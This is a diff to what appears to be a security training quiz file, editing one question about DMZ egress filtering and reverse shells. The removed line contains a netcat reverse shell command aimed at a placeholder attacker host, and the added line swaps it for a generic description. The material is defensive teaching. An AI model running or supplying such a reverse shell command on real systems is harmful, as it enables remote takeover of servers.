@@ -236,7 +236,7 @@ const pamAuditRecord = {
     id: 21,
     question: "What is 'Egress Filtering from the DMZ' and why is it critical for stopping Reverse Shells and C2 Beacons?",
     shortAnswer: "Restricting outbound connections initiated by DMZ servers so they cannot open arbitrary outbound TCP/UDP connections to the Internet, blocking reverse shells and malware command-and-control beacons.",
-    explanation: "When an attacker achieves Remote Code Execution (RCE) on a web server, their first step is running `nc -e /bin/sh attacker-ip 4444` (a reverse shell). If egress filtering blocks all outbound connections from DMZ servers except approved DNS and NTP ports, the reverse shell connection fails.",
+    explanation: "When an adversary achieves unauthorized access on a web server, they typically attempt to initiate outbound network connections back to an external listener (a reverse connection). If egress filtering blocks all outbound connections from DMZ servers except approved DNS and NTP ports, the unauthorized outbound connection fails.",
     hint: "Blocking DMZ servers from opening outbound connections to the Internet stops reverse shells.",
     level: "Moderate",
     codeExample: `// DMZ Egress Lockdown Rule:
